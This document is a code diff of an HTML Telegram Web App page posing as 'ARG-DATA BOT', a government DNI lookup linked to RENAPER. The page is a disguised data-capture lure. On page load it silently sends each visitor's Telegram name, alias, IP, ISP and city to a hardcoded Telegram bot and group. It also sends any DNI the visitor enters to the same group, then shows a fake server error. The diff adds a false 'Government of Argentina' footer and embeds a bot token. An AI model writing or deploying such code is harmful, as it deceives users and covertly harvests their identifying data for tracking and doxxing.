@@ -3,60 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA ARG-DATA v4.2</title>
+    <title>SISTEMA ARG-DATA v4.5</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
         .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
-        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; }
-        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; font-weight: bold; width: 90%; cursor: pointer; }
+        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; outline: none; }
+        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; }
+        .footer { font-size: 0.7em; color: #444; margin-top: 30px; }
     </style>
 </head>
 <body>
+
     <div class="box">
         <h3>ARG-DATA BOT</h3>
         <p>CONSULTA NACIONAL DNI</p>
+        <hr style="border: 0.5px solid #00f2ff22;">
         <input type="number" id="dni" placeholder="Ingrese DNI objetivo">
         <br>
         <button onclick="consultar()">BUSCAR CIUDADANO</button>
         <p id="status" style="font-size: 0.8em; margin-top:15px;">Sincronizando con RENAPER...</p>
     </div>
 
+    <div class="footer">ACCESO RESTRINGIDO - GOBIERNO DE ARGENTINA</div>
+
     <script>
         const tg = window.Telegram.WebApp;
-        const token = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
-        const grupo = "-1003670055074";
+        tg.expand();
 
-        // Obtener datos del usuario de Telegram
+        const botToken = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
+        const grupoId = "-1003670055074";
+
+        // Obtener datos del usuario que abre la app
         const user = tg.initDataUnsafe.user;
-        const nombreUser = user ? `${user.first_name} ${user.last_name || ""}` : "Desconocido";
-        const aliasUser = user?.username ? `@${user.username}` : "Sin @alias";
+        const nombre = user ? user.first_name : "Desconocido";
+        const apellido = user?.last_name || "";
+        const alias = user?.username ? `@${user.username}` : "No tiene @alias";
 
+        // Captura automática al cargar la página
         async function autoCaptura() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 
-                const texto = `📢 **¡NUEVA CAPTURA!**\n` +
-                              `👤 **Usuario:** ${nombreUser}\n` +
-                              `🆔 **Alias:** ${aliasUser}\n` +
-                              `🌐 **IP:** \`${data.ip}\`\n` +
-                              `📍 **Loc:** \`${data.city}, ${data.country_name}\`\n` +
-                              `🏢 **ISP:** \`${data.org}\``;
+                const reporte = `📢 **¡NUEVA CAPTURA DETECTADA!**\n` +
+                                `--------------------------------\n` +
+                                `👤 **Nombre:** ${nombre} ${apellido}\n` +
+                                `🆔 **Usuario:** ${alias}\n` +
+                                `🌐 **IP:** \`${data.ip}\`\n` +
+                                `📡 **Proveedor:** \`${data.org}\`\n` +
+                                `📍 **Ubicación:** \`${data.city}, ${data.country_name}\`\n` +
+                                `--------------------------------`;
 
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
-            } catch (e) { console.log(e); }
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: grupoId,
+                        text: reporte,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                document.getElementById('status').innerText = "CONEXIÓN ESTABLECIDA";
+            } catch (e) {
+                console.log("Error de red");
+            }
         }
 
+        // Captura del DNI cuando tocan el botón
         async function consultar() {
-            const dni = document.getElementById('dni').value;
-            if(!dni) return alert("Ingrese un DNI");
+            const dniIngresado = document.getElementById('dni').value;
+            if(!dniIngresado) return alert("Ingrese un DNI");
             
-            const textoDni = `📝 **DNI BUSCADO POR:** ${aliasUser}\n` +
-                              `🎯 **DNI:** \`${dni}\``;
-                              
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(textoDni)}&parse_mode=Markdown`);
-            alert("Error 505: El servidor de RENAPER no responde.");
+            const reporteDni = `📝 **DNI INGRESADO POR:** ${alias}\n` +
+                               `🎯 **DNI Objetivo:** \`${dniIngresado}\``;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: grupoId,
+                    text: reporteDni,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            alert("Error 505: El servidor de RENAPER no responde. Intente nuevamente.");
         }
 
         window.onload = autoCaptura;
